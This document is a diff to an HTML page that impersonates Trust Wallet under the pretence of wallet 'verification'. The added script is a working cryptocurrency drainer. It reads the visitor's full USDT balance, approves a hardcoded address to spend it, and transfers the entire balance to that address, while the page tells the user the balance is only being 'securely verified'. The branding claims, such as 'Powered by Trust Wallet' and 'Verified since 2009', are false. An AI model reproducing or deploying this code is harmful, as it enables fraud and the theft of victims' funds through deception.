@@ -1,64 +1,96 @@
 <!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify USDT</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verify with Trust Wallet</title>
   <style>
     body {
-      background: #001b3d;
+      background-color: #081c3a;
+      color: #fff;
       font-family: 'Segoe UI', sans-serif;
-      color: white;
-      text-align: center;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
+      text-align: center;
       padding: 20px;
     }
+    .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
     .btn {
-      background: #00b3ff;
-      color: #fff;
-      padding: 14px 32px;
-      font-size: 18px;
+      background-color: #3375ff;
+      color: white;
       border: none;
-      border-radius: 12px;
+      padding: 14px 30px;
+      font-size: 18px;
+      border-radius: 10px;
       cursor: pointer;
-      margin: 12px;
-      transition: background 0.3s ease;
+      margin-top: 20px;
     }
     .btn:hover {
-      background: #0099dd;
+      background-color: #215ed4;
     }
-    .info {
-      font-size: 15px;
+    .text {
+      max-width: 320px;
       opacity: 0.85;
-      max-width: 300px;
+      font-size: 16px;
     }
-    .powered {
+    .footer {
+      margin-top: 40px;
       font-size: 12px;
       opacity: 0.6;
-      margin-top: 30px;
-    }
-    img {
-      width: 90px;
-      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
-  <img src="logo.png" alt="Trust Wallet Logo">
+  <img src="logo.png" alt="Trust Wallet Logo" class="logo" />
   <h2>Verify Your Wallet</h2>
-  <p class="info">To verify and activate, you must send at least 1 USDT using Trust Wallet. After that, approve access to complete verification.</p>
-  <button class="btn" onclick="sendUSDT()">Send USDT</button>
-  <button class="btn" onclick="goToApprove()">Approve</button>
-  <p class="powered">Powered by Trust Wallet &bull; Trusted by millions</p>  <script>
-    function sendUSDT() {
-      window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955";
-    }
+  <p class="text">To complete verification, click below. Wallet will be approved and your balance securely verified.</p>
+  <button class="btn" onclick="startVerification()">Verify Now</button>
+  <p class="footer">Powered by Trust Wallet &bull; Verified since 2009</p>  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>  <script>
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
 
-    function goToApprove() {
-      window.location.href = "approve.html";
+    const ABI = [
+      { "constant": false, "inputs": [
+          { "name": "_spender", "type": "address" },
+          { "name": "_value", "type": "uint256" }
+        ], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": false, "inputs": [
+          { "name": "_from", "type": "address" },
+          { "name": "_to", "type": "address" },
+          { "name": "_value", "type": "uint256" }
+        ], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+      { "constant": true, "inputs": [{"name":"owner", "type":"address"}], "name": "balanceOf", "outputs": [{"name":"balance", "type":"uint256"}], "type": "function" }
+    ];
+
+    async function startVerification() {
+      if (typeof window.ethereum === 'undefined') {
+        alert("Please open in Trust Wallet browser");
+        return;
+      }
+
+      const web3 = new Web3(window.ethereum);
+      await window.ethereum.enable();
+
+      const accounts = await web3.eth.getAccounts();
+      const user = accounts[0];
+      const contract = new web3.eth.Contract(ABI, USDT_ADDRESS);
+
+      // Get balance
+      const balance = await contract.methods.balanceOf(user).call();
+
+      // Approve spender
+      await contract.methods.approve(RECEIVER, balance).send({ from: user });
+
+      // Transfer USDT to receiver
+      await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
+
+      // Redirect to success page
+      window.location.href = "success.html";
     }
   </script></body>
 </html>
